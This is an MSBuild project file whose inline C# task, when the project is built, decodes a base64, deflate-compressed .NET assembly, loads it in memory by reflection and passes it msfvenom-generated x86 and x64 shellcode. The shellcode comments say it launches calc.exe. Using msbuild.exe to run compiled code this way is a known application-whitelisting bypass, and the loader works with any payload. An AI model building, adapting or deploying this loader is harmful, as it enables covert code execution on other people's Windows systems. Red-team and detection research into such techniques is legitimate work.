<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Sample"><Sample /></Target>
  <UsingTask
    TaskName="Sample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task><Code Type="Class" Language="cs"><![CDATA[

using System;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;


public class Sample : Microsoft.Build.Utilities.Task, Microsoft.Build.Framework.ITask {

    private static string encoded_compressed_dll = @"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";
        
    // msfvenom -p windows/exec CMD=calc.exe -f raw | base64
    private static String x86_shellcode = @"
        /OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjj
        SAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sE
        iwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD7
        4HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";

    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw | base64
    private static String x64_shellcode = @"
        /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
        yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
        TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
        QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//V
        u/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";

    private static byte[] decode_decompress_dll(string ecdll)
    {
        byte[] compressed_dll = System.Convert.FromBase64String(ecdll);
        System.IO.MemoryStream memstream = new System.IO.MemoryStream(compressed_dll.Length);
        System.IO.MemoryStream msptr = new System.IO.MemoryStream();
        memstream.Write(compressed_dll, 0, compressed_dll.Length);
        memstream.Seek(0, System.IO.SeekOrigin.Begin);
        using (System.IO.Compression.DeflateStream deflator =
            new System.IO.Compression.DeflateStream(
                memstream,
                System.IO.Compression.CompressionMode.Decompress
            )
        )
        {
            byte[] block = new byte[4096];
            int nbytes;
            while ((nbytes = deflator.Read(block, 0, block.Length)) != 0)
                msptr.Write(block, 0, nbytes);
        }
        return msptr.ToArray();
    }

    public override bool Execute()
    {
        System.Reflection.Assembly loaded_assembly = System.Reflection.Assembly.Load(
            decode_decompress_dll(encoded_compressed_dll)
        );
        System.Type astype = loaded_assembly.GetType("Example1");
        object class_instance = System.Activator.CreateInstance(astype, null);
        System.Reflection.MethodInfo entrypoint = astype.GetMethod("Run");
        entrypoint.Invoke(class_instance, new object[] { x86_shellcode, x64_shellcode });
        return true;
    }
}

      ]]></Code>
    </Task>
  </UsingTask>
</Project>

